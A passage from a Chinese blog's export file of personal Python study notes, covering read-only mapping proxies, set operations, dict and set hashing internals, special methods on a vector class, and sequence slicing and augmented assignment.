方法。</p><p>Mapping.get</p><p>在 上一个示例中，我们不得不改写 get 方法，好让 它的表现跟 <code>__getitem__</code> 一致。这个实例就没这个必要了，因为它继承了 Mapping.get 方法.</p><h2 id="37-不可变映射类型"><a class="markdownIt-Anchor" href="#37-不可变映射类型"></a> 3.7 不可变映射类型</h2><h3 id="mappingproxytype"><a class="markdownIt-Anchor" href="#mappingproxytype"></a> <strong>MappingProxyType</strong></h3><p>如果给这个类一个映射，它会返回一个只读的映 射视图。虽然是个只读视图，但是它是动态的。这意味着如果对原映射 做出了改动，我们通过这个视图可以观察到，但是无法通过这个视图对 原映射做出修改。演示:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> types <span class="hljs-keyword">import</span> MappingProxyType<br>d = &#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-number">1</span>&#125;<br>d_proxy = MappingProxyType(d)<br><span class="hljs-built_in">print</span>(d_proxy)<br>d_proxy[a] = <span class="hljs-string">&#x27;2&#x27;</span><br>d[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-number">666</span>  <span class="hljs-comment"># d_proxy 是动态的，也就是说对 d 所做的任何改动都会反馈到它上面。</span><br><span class="hljs-built_in">print</span>(d_proxy) <span class="hljs-comment">#&#123;&#x27;a&#x27;: 666&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;&#x27;a&#x27;: 1&#125;</span><br><span class="hljs-string">Traceback (most recent call last):</span><br><span class="hljs-string">  File &quot;第三章.py&quot;, line 81, in &lt;module&gt;</span><br><span class="hljs-string">    d_proxy[a] = &#x27;2&#x27;</span><br><span class="hljs-string">TypeError: &#x27;mappingproxy&#x27; object does not support item assignment</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="38-集合论"><a class="markdownIt-Anchor" href="#38-集合论"></a> 3.8 集合论</h2><p>集合中的元素必须是可散列的，set 类型本身是不可散列的，但是 frozenset 可以。因此可以创建一个包含不同 frozenset 的 set。 除了保证唯一性，集合还实现了很多基础的中缀运算符。</p><p>给定两个集合 a 和 b，<strong>a | b 返回的是它们的合集，a &amp; b 得到的是交集，而 a - b 得到的是差集</strong>。行时间。</p><p>例如想求集合a在b中的出现次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">found = <span class="hljs-built_in">len</span>(a &amp; b)<br></code></pre></td></tr></table></figure><p>needles 的元素在 haystack 里出现的次数，以下代码可以用在任何可迭代对象上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">found = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">set</span>(needles) &amp; <span class="hljs-built_in">set</span>(haystack))<br><span class="hljs-comment"># 另一种写法：</span><br>found = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">set</span>(needles).intersection(haystack))<br></code></pre></td></tr></table></figure><h3 id="381-集合字面量"><a class="markdownIt-Anchor" href="#381-集合字面量"></a> 3.8.1 集合字面量</h3><p>除空集之外，集合的字面量——{1}、{1, 2}，等等——看起来跟它的 数学形式一模一样。如果是空集，那么必须写成 <strong>set()</strong> 的形式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a = &#123;<span class="hljs-number">1</span>&#125;<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(a))<br>a.pop()<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(a))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;class &#x27;set&#x27;&gt;</span><br><span class="hljs-string">set()  #说明空集表示为set()</span><br><span class="hljs-string">&lt;class &#x27;set&#x27;&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="382-集合推导"><a class="markdownIt-Anchor" href="#382-集合推导"></a> 3.8.2 集合推导</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> unicodedata <span class="hljs-keyword">import</span> name  <span class="hljs-comment">#引入unicodedata 模块里导入 name 函数，获取字符的名字</span><br><span class="hljs-built_in">print</span>(&#123;<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">256</span>) <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;SIGN&#x27;</span> <span class="hljs-keyword">in</span> name(<span class="hljs-built_in">chr</span>(i),<span class="hljs-string">&#x27;&#x27;</span>)&#125; ) <span class="hljs-comment">#如果字符的名字包含“SIGN”，放入集合</span><br><span class="hljs-comment">#&#123;&#x27;±&#x27;, &#x27;=&#x27;, &#x27;#&#x27;, &#x27;%&#x27;, &#x27;§&#x27;, &#x27;®&#x27;, &#x27;©&#x27;, &#x27;&lt;&#x27;, &#x27;¤&#x27;, &#x27;µ&#x27;, &#x27;¢&#x27;, &#x27;¶&#x27;, &#x27;+&#x27;, &#x27;£&#x27;, &#x27;°&#x27;, &#x27;×&#x27;, &#x27;¥&#x27;, &#x27;&gt;&#x27;, &#x27;¬&#x27;, &#x27;÷&#x27;, &#x27;$&#x27;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="383-集合的操作"><a class="markdownIt-Anchor" href="#383-集合的操作"></a> 3.8.3 集合的操作</h3><p><img src="/2022/03/22/python%E5%AD%A6%E4%B9%A0-3/image-20220322174616196.png" alt="image-20220322174616196"></p><p><img src="/2022/03/22/python%E5%AD%A6%E4%B9%A0-3/image-20220322174650947.png" alt="image-20220322174650947"></p><h2 id="39-dict和set的背后"><a class="markdownIt-Anchor" href="#39-dict和set的背后"></a> 3.9 dict和set的背后</h2><h3 id="392-字典中的散列表"><a class="markdownIt-Anchor" href="#392-字典中的散列表"></a> 3.9.2 字典中的散列表</h3><p>散列表其实是一个稀疏数组（总是有空白元素的数组称为稀疏数组）。 在一般的数据结构教材中，散列表里的单元通常叫作表元（bucket）。 在 dict 的散列表当中，每个键值对都占用一个表元，每个表元都有两 个部分，一个是对键的引用，另一个是对值的引用。因为所有表元的大 小一致，所以可以通过偏移量来读取某个表元。 因为 Python 会设法保证大概还有三分之一的表元是空的，所以在快要达 到这个阈值的时候，原有的散列表会被复制到一个更大的空间里面。  如果要把一个对象放入散列表，那么首先要计算这个元素键的散列值。</p><p><strong>01 散列值和相等性</strong></p><p>内置的 hash() 方法可以用于所有的内置类型对象。如果是自定义 对象调用 hash() 的话，实际上运行的是自定义的 <code>__hash__</code>。如 果两个对象在比较的时候是相等的，那它们的散列值必须相等，否 则散列表就不能正常运行了。例如，如果 1 == 1.0 为真，那么 hash(1) == hash(1.0) 也必须为真，但其实这两个数字（整型 和浮点）的内部结构是完全不一样的。 为了让散列值能够胜任散列表索引这一角色，它们必须在索引空间 中尽量分散开来。这意味着在最理想的状况下，越是相似但不相等 的对象，它们散列值的差别应该越大。示例 3-16 是一段代码输 出，这段代码被用来比较散列值的二进制表达的不同。注意其中 1 和 1.0 的散列值是相同的，而 1.0001、1.0002 和 1.0003 的散列值则 非常不同。</p><p><img src="/2022/03/22/python%E5%AD%A6%E4%B9%A0-3/image-20220322190635251.png" alt="image-20220322190635251"></p><p><strong>02. 散列表算法</strong></p><p>为了获取 my_dict[search_key] 背后的值，Python 首先会调用 <strong>hash(search_key) 来计算 search_key 的散列值</strong>，把这个值最低 的几位数字当作偏移量，在散列表里查找表元（具体取几位，得看 当前散列表的大小）。若找到的表元是空的，则抛出 KeyError 异 常。若不是空的，则表元里会有一对 found_key:found_value。 这时候 Python 会检验 search_key == found_key 是否为真，如 果它们相等的话，就会返回 found_value。 如果 search_key 和 found_key 不匹配的话，这种情况称为散列 冲突。发生这种情况是因为，散列表所做的其实是把随机的元素映 射到只有几位的数字上，而散列表本身的索引又只依赖于这个数字 的一部分。为了解决散列冲突，算法会在散列值中另外再取几位， 然后用特殊的方法处理一下，把新得到的数字再当作索引来寻找表 元。 若这次找到的表元是空的，则同样抛出 KeyError；若非 空，或者键匹配，则返回这个值；或者又发现了散列冲突，则重复 以上的步骤。</p><p>具体步骤如图</p><p><img src="/2022/03/22/python%E5%AD%A6%E4%B9%A0-3/image-20220322190505481.png" alt="image-20220322190505481"></p><h3 id="393-dict的实现及其导致的结果"><a class="markdownIt-Anchor" href="#393-dict的实现及其导致的结果"></a> 3.9.3 dict的实现及其导致的结果</h3><ol><li><p><strong>键必须是可散列的 一个可散列的对象必须满足以下要求。</strong></p><p>(1) 支持 hash() 函数，并且通过 <code>__hash__()</code> 方法所得到的散列 值是不变的。</p><p>(2) 支持通过 <strong>eq</strong>() 方法来检测相等性。</p><p>(3) 若 a == b 为真，则 hash(a) == hash(b) 也为真。 所有由用户自定义的对象默认都是可散列的，因为它们的散列值由 id() 来获取，而且它们都是不相等的。</p></li><li><p><strong>字典在内存上的开销巨大</strong></p><pre><code> 由于字典使用了散列表，而散列表又必须是稀疏的，这导致它在空间上的效率低下</code></pre></li><li><p><strong>键查询很快</strong></p><p>dict 的实现是典型的空间换时间：字典类型有着巨大的内存开 销，但它们提供了无视数据量大小的快速访问——只要字典能被装 在内存里。</p></li><li><p><strong>键的次序取决于添加顺序</strong></p></li></ol><p>键有顺序，并且取决于添加顺序，判断2个字典是否一样时只看里面存储的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">dicta = &#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>&#125;<br>dictb = &#123;<span class="hljs-string">&#x27;b&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125;<br>dictc = &#123;<span class="hljs-string">&#x27;b&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>&#125;<br><span class="hljs-built_in">print</span> (dicta,dictb,dictc)<br><span class="hljs-built_in">print</span> (dicta == dictb == dictc)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;&#x27;a&#x27;: &#x27;1&#x27;, &#x27;b&#x27;: &#x27;2&#x27;, &#x27;c&#x27;: &#x27;3&#x27;&#125; &#123;&#x27;b&#x27;: &#x27;2&#x27;, &#x27;c&#x27;: &#x27;3&#x27;, &#x27;a&#x27;: &#x27;1&#x27;&#125; &#123;&#x27;b&#x27;: &#x27;2&#x27;, &#x27;a&#x27;: &#x27;1&#x27;, &#x27;c&#x27;: &#x27;3&#x27;&#125;</span><br><span class="hljs-string">True</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="394-set的实现以及导致的结果"><a class="markdownIt-Anchor" href="#394-set的实现以及导致的结果"></a> 3.9.4 set的实现以及导致的结果</h3><p>set 和 frozenset 的实现也依赖散列表，但在它们的散列表里存放的只有元素的引用**（就像在字典里只存放键而没有相应的值）。**在 set 加 入到 Python 之前，我们都是把字典加上无意义的值当作集合来用的。字典和散列表的几个特点，对集合来说几乎都是适用的。为了避免太多重复的内容，这些特点总结如下。</p><p><strong>集合里的元素必须是可散列的。</strong></p><p><strong>集合很消耗内存。</strong></p><p><strong>可以很高效地判断元素是否存在于某个集合。</strong></p><p><strong>元素的次序取决于被添加到集合里的次序。</strong></p><p><strong>往集合里添加元素，可能会改变集合里已有元素的次序</strong></p><p>和字典的特点几乎差不多</p>]]></content>
    
    
    <categories>
      
      <category>python学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python学习-2</title>
    <link href="/2022/03/20/python%E5%AD%A6%E4%B9%A0-2/"/>
    <url>/2022/03/20/python%E5%AD%A6%E4%B9%A0-2/</url>
    
    <content type="html"><![CDATA[<h1 id="小记录"><a class="markdownIt-Anchor" href="#小记录"></a> 小记录</h1><p>元组是不可变序列，例如用了*=运算时，会重新创建一个元组并且赋值</p><p>原子操作（<strong>atomic operation</strong>），指不会被线程调度机制打断的操作，这种操作一旦开始，就一直运行到结束，中间不会切换到其他线程。</p><h1 id="python特殊方法"><a class="markdownIt-Anchor" href="#python特殊方法"></a> python特殊方法</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> hypot<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vector</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, x=<span class="hljs-number">0</span>, y=<span class="hljs-number">0</span></span>):</span><br>        self.x = x<br>        self.y = y<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Vector(%r, %r)&#x27;</span> % (self.x, self.y)<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__abs__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> hypot(self.x, self.y)<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bool__</span>(<span class="hljs-params">self</span>):</span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(<span class="hljs-built_in">abs</span>(self))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__add__</span>(<span class="hljs-params">self, other</span>):</span><br>        x = self.x + other.x<br>        y = self.y + other.y<br>        <span class="hljs-keyword">return</span> Vector(x, y)<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__mul__</span>(<span class="hljs-params">self, scalar</span>):</span><br>        <span class="hljs-keyword">return</span> Vector(self.x * scalar, self.y * scalar)<br> <br></code></pre></td></tr></table></figure><p>定义一个二维向量类，使用了python的几个特殊方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># __repr__、__abs__、__add__ 和 __mul__</span><br><span class="hljs-comment">#repr 就是通过 __repr__这个特殊方法来得到一个对象的字符串表示形式的</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Vector(%r, %r)&#x27;</span> % (self.x, self.y)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">如果没有实现</span><br><span class="hljs-string">__repr__，当我们在控制台里打印一个向量的实例时，得到的字符串</span><br><span class="hljs-string">可能会是 &lt;Vector object at 0x10e100070&gt;。</span><br><span class="hljs-string">__repr__ 和 __str__ 的区别在于，后者是在 str() 函数被使用，或</span><br><span class="hljs-string">是在用 print 函数打印一个对象的时候才被调用的，并且它返回的字</span><br><span class="hljs-string">符串对终端用户更友好。</span><br><span class="hljs-string">例如：</span><br><span class="hljs-string">&gt;&gt; v * 3</span><br><span class="hljs-string">Vector(9, 12)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># __add__ 和 __mul__，算术运算符+，*</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">这两个方法的返回值都是新创建的向量对</span><br><span class="hljs-string">象，被操作的两个向量（self 或 other）还是原封不动，代码里只是</span><br><span class="hljs-string">读取了它们的值而已。</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><h1 id="序列构成的数组"><a class="markdownIt-Anchor" href="#序列构成的数组"></a> 序列构成的数组</h1><h2 id="1内置序列类型"><a class="markdownIt-Anchor" href="#1内置序列类型"></a> 1.内置序列类型</h2><p>容器序列 list、tuple 和 collections.deque 这些序列能存放不同类型的 数据。</p><p>扁平序列 str、bytes、bytearray、memoryview 和 array.array，这类 序列只能容纳一种类型。</p><p>按照可变和不可变</p><p>可变序列 list、bytearray、array.array、collections.deque 和 memoryview。</p><p>不可变序列 tuple、str 和 bytes。</p><h1 id="第二章-序列组成的数组"><a class="markdownIt-Anchor" href="#第二章-序列组成的数组"></a> 第二章 序列组成的数组</h1><h2 id="22-列表推导和生成器表达式"><a class="markdownIt-Anchor" href="#22-列表推导和生成器表达式"></a> 2.2 列表推导和生成器表达式</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#2.2 列表推导和生成器表达式</span><br>test = <span class="hljs-string">&#x27;abcde&#x27;</span><br><span class="hljs-built_in">print</span> ([<span class="hljs-built_in">ord</span>(testvar)  <span class="hljs-keyword">for</span> testvar <span class="hljs-keyword">in</span> test])<br><span class="hljs-comment">#[97, 98, 99, 100, 101]</span><br></code></pre></td></tr></table></figure><h2 id="24切片"><a class="markdownIt-Anchor" href="#24切片"></a> 2.4切片</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-built_in">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>[<span class="hljs-number">2</span>:])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>[:<span class="hljs-number">2</span>])<span class="hljs-comment">#在下标2的地方分割</span><br><span class="hljs-comment">#[3, 4, 5, 6]</span><br><span class="hljs-comment">#[1, 2]</span><br><br><span class="hljs-comment">#对对象切片</span><br><span class="hljs-comment">#[a:b:c]取值方式,在a和b之间以c为间隔进行取值</span><br>s=<span class="hljs-string">&#x27;abcdefgh&#x27;</span><br><span class="hljs-built_in">print</span>(s[::<span class="hljs-number">2</span>])<br><span class="hljs-comment">#aceg</span><br><br><span class="hljs-comment">#多维切片和省略</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[] 运算符里还可以使用以逗号分开的多个索引或者是切片，外部库</span><br><span class="hljs-string">NumPy 里就用到了这个特性，二维的 numpy.ndarray 就可以用 a[i,</span><br><span class="hljs-string">j] 这种形式来获取，抑或是用 a[m:n, k:l] 的方式来得到二维切片。</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#切片赋值</span><br><span class="hljs-built_in">list</span> = [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<br><span class="hljs-built_in">list</span>[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>] = [<span class="hljs-number">999</span>,<span class="hljs-number">888</span>]<span class="hljs-comment">#下标2开始到下标5之前</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-comment">#[0, 1, 999, 888, 5, 6]</span><br></code></pre></td></tr></table></figure><h2 id="对序列使用和"><a class="markdownIt-Anchor" href="#对序列使用和"></a> 对序列使用+和*</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#对序列使用+和*</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">。通常 + 号两侧的序列由</span><br><span class="hljs-string">相同类型的数据所构成，在拼接的过程中，两个被操作的序列都不会被</span><br><span class="hljs-string">修改，Python 会新建一个包含同样类型数据的序列来作为拼接的结果。</span><br><span class="hljs-string">如果想要把一个序列复制几份然后再拼接起来，更快捷的做法是把这个</span><br><span class="hljs-string">序列乘以一个整数。同样，这个操作会产生一个新序列：</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">list</span> = [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span> *<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span> +[<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>])<br><span class="hljs-comment">#[0, 1, 2, 3, 4, 5, 6, 0, 1, 2, 3, 4, 5, 6]</span><br><span class="hljs-comment">#[0, 1, 2, 3, 4, 5, 6, 9, 8, 7]</span><br><br><span class="hljs-comment">#建立列表组成的列表</span><br>board = [[<span class="hljs-string">&#x27;_&#x27;</span>] * <span class="hljs-number">3</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)] <br><span class="hljs-built_in">print</span>(board)<br><span class="hljs-comment">#[[&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;]]</span><br>board[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;X&#x27;</span> <br><span class="hljs-built_in">print</span>(board)<br><span class="hljs-comment">#[[&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;X&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;]]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">如果在 a * n 这个语句中，序列 a 里的元素是对其他可变</span><br><span class="hljs-string">对象的引用的话，你就需要格外注意了，因为这个式子的结果可能</span><br><span class="hljs-string">会出乎意料。比如，你想用 my_list = [[]] * 3 来初始化一个</span><br><span class="hljs-string">由列表组成的列表，但是你得到的列表里包含的 3 个元素其实是 3</span><br><span class="hljs-string">个引用，而且这 3 个引用指向的都是同一个列表。这可能不是你想</span><br><span class="hljs-string">要的效果。</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#错误效果</span><br>weird_board = [[<span class="hljs-string">&#x27;_&#x27;</span>] * <span class="hljs-number">3</span>] * <span class="hljs-number">3</span><br><span class="hljs-built_in">print</span>(weird_board)<br>weird_board[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;x&#x27;</span><br><span class="hljs-built_in">print</span>(weird_board)<br><span class="hljs-comment">#[[&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;_&#x27;]]</span><br><span class="hljs-comment">#[[&#x27;_&#x27;, &#x27;_&#x27;, &#x27;x&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;x&#x27;], [&#x27;_&#x27;, &#x27;_&#x27;, &#x27;x&#x27;]]</span><br></code></pre></td></tr></table></figure><h2 id="26序列的增量赋值"><a class="markdownIt-Anchor" href="#26序列的增量赋值"></a> 2.6序列的增量赋值</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">+= 背后的特殊方法是 __iadd__ （用于“就地加法”）。但是如果一个类</span><br><span class="hljs-string">没有实现这个方法的话，Python 会退一步调用 __add__ 。考虑下面这</span><br><span class="hljs-string">个简单的表达式：</span><br><span class="hljs-string">a += b</span><br><span class="hljs-string">a 实现了 __iadd__ 方法，就会调用这个方法（像 a.extend(b) 一样），如果没有实现的话，首先计算 a +</span><br><span class="hljs-string">b，得到一个新的对象，然后赋值给 a</span><br><span class="hljs-string">但是*=的效果不一样</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(<span class="hljs-built_in">list</span>),<span class="hljs-built_in">list</span>)<br><span class="hljs-built_in">list</span> *=<span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(<span class="hljs-built_in">list</span>),<span class="hljs-built_in">list</span>)<br>tuple1 = (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(tuple1),tuple1)<br>tuple1 *=<span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(tuple1),tuple1)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">2418655396032 [1, 2, 3]</span><br><span class="hljs-string">2418655396032 [1, 2, 3, 1, 2, 3]</span><br><span class="hljs-string">2418657982848 (1, 2, 3)</span><br><span class="hljs-string">2418655659776 (1, 2, 3, 1, 2, 3)</span><br><span class="hljs-string">可以看到元组进行增量计算时重新创建了对象</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 